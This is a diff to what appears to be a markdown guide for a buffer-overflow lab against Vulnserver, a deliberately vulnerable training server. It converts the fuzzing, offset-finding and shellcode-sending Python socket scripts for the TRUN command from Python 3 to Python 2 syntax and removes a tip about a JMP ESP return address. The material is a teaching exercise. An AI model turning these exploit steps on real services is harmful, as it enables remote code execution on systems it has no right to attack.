@@ -3149,13 +3149,13 @@ while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('<IP Vulnserver>', <port vulnserver>))
-        s.send(('TRUN /.:/' + buffer).encode())
+        s.send(('TRUN /.:/' + buffer))
         
         s.close()
         sleep(1)
         buffer += "A" * 100
     except:
-        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
+        print "Fuzzing crashed at %s bytes" % str(len(buffer))
         sys.exit()
 ```
 
@@ -3174,10 +3174,10 @@ while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('<IP Vulnserver>', <port vulnserver>))
-           s.send(('TRUN /.:/' + offset).encode())
+           s.send(('TRUN /.:/' + offset))
            s.close()
        except:
-           print ("Error connecting to the server")
+           print "Error connecting to the server"
            sys.exit()
    ```
 3. After running the script, read the value from the EIP
@@ -3198,10 +3198,10 @@ while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('<IP Vulnserver>', <port vulnserver>))
-		s.send(('TRUN /.:/' + shellcode).encode())
+		s.send(('TRUN /.:/' + shellcode))
 		s.close()
 	except:
-		print ("Error connecting to the server")
+		print "Error connecting to the server"
 		sys.exit()
 ```
 
@@ -3239,10 +3239,10 @@ while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('<IP Vulnserver>', <port vulnserver>))
-		s.send(('TRUN /.:/' + shellcode).encode())
+		s.send(('TRUN /.:/' + shellcode))
 		s.close()
 	except:
-		print ("Error connecting to the server")
+		print "Error connecting to the server"
 		sys.exit()
 ```
 
@@ -3283,7 +3283,6 @@ On Immunity, using mona, type
    		sys.exit()
    ```
    - Before launching the script, in Immunify click on `Enter expression to follow` > insert `625011af` > Click on it > press `F2` to inser a breakpoint
-   - Using python3, you may need to change the value for `shellcode` in `"A" * 1996 + "\x84\xaf\x11\x50\x62\xaf\x11\x50\x62\x84"`
 
 #### <ins>Generating Shellcode</ins>
 
